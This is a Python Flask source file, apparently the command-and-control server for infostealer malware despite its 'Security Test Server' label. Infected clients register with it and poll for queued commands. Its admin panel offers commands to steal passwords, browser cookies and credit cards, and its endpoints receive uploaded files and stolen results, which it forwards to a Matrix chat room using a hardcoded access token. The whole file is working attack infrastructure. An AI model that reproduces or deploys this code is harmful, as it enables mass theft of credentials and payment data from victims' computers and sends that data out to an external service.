from flask import Flask, request, jsonify
import threading
import time
import json
import requests
from datetime import datetime
import logging
import os

app = Flask(__name__)

# Configurazione
MATRIX_WEBHOOK = "https://matrix.org/_matrix/client/r0/rooms/!skCsZdyGNtJBgEQDDL:matrix.org/send/m.room.message"
MATRIX_TOKEN = "mat_ODGV8OXrsTxufmSAhqgaMNGdyxAejW_eFbnI3"

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
        self.commands_queue = {}  # 🆕 Coda comandi per client
    
    def add_client(self, client_data, ip_address):
        with self.lock:
            client_id = self.next_client_id
            self.clients[client_id] = {
                "data": client_data,
                "last_seen": datetime.now(),
                "ip": ip_address
            }
            self.next_client_id += 1
            return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_command(self, client_id, command):
        """🆕 Aggiungi comando alla coda per un client"""
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        """🆕 Prendi il prossimo comando per un client"""
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None

client_manager = ClientManager()

def send_to_matrix(message, data_type="SERVER"):
    """Invia notifiche a Matrix"""
    try:
        payload = {
            "msgtype": "m.text",
            "body": f"[{data_type}] {message}"
        }
        headers = {
            "Authorization": f"Bearer {MATRIX_TOKEN}",
            "Content-Type": "application/json"
        }
        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers, timeout=10)
    except Exception as e:
        print(f"Matrix error: {e}")

@app.route('/')
def home():
    clients_count = len(client_manager.list_clients())
    return f"""
    <h1>Security Test Server</h1>
    <p>PythonAnywhere + Matrix</p>
    <p>Client connessi: {clients_count}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/clients">View Clients</a></p>
    """

@app.route('/admin')
def admin_panel():
    """🆕 Interfaccia admin per inviare comandi"""
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
    
    return f'''
    <h2>Admin Control Panel</h2>
    <form action="/send_command" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>Command:</label>
        <select name="command">
            <option value="passwords">Get Passwords</option>
            <option value="cookies">Get Cookies</option>
            <option value="cards">Get Credit Cards</option>
            <option value="systeminfo">System Info</option>
        </select><br><br>
        
        <button type="submit">Send Command</button>
    </form>
    <p><a href="/clients">View All Clients</a></p>
    '''

@app.route('/send_command', methods=['POST'])
def send_command_web():
    """🆕 Versione web per comandi"""
    client_id = request.form.get('client_id')
    command = request.form.get('command')
    
    if client_id and command:
        client_manager.add_command(int(client_id), command)
        send_to_matrix(f"🌐 Comando web '{command}' per client {client_id}")
    
    return f'''
    <h3>Command Sent!</h3>
    <p>Command: {command} to Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/api/register', methods=['POST'])
def register_client():
    """Client si registra al server"""
    try:
        client_data = request.json
        client_ip = request.remote_addr
        client_id = client_manager.add_client(client_data, client_ip)
        
        send_to_matrix(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered successfully"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_commands', methods=['GET'])
def check_commands():
    """🆕 Endpoint per check comandi - richiesto dal client"""
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"})
        
        command = client_manager.get_command(int(client_id))
        
        return jsonify({
            "status": "success",
            "command": command,  # None se nessun comando
            "message": "Command check completed"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/command', methods=['POST'])
def send_command_api():
    """Invia comando a client specifico via API"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        client = client_manager.get_client(client_id)
        if not client:
            return jsonify({"status": "error", "message": "Client not found"})
        
        client_manager.add_command(client_id, command)
        send_to_matrix(f"📡 Comando '{command}' per client {client_id}")
        
        return jsonify({
            "status": "success", 
            "message": f"Command '{command}' queued for client {client_id}"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Client uploada file"""
    try:
        client_id = request.form.get('client_id')
        file_type = request.form.get('type', 'file')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file uploaded"})
        
        file = request.files['file']
        filename = f"{client_id}_{file_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        file.save(filename)
        
        send_to_matrix(f"📁 File ricevuto da client {client_id}: {filename}")
        
        return jsonify({"status": "success", "message": f"File {filename} saved"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    """Lista client connessi"""
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "clients": {
            cid: {
                "data": info["data"],
                "last_seen": info["last_seen"].isoformat(),
                "ip": info["ip"]
            } for cid, info in clients.items()
        }
    })

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Ricevi risultati dai client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        results = data.get('results')
        
        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:500]}...")
        
        # Salva risultati
        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    send_to_matrix("🚀 Server Flask avviato su PythonAnywhere")
    app.run(host='0.0.0.0', port=port, debug=False)
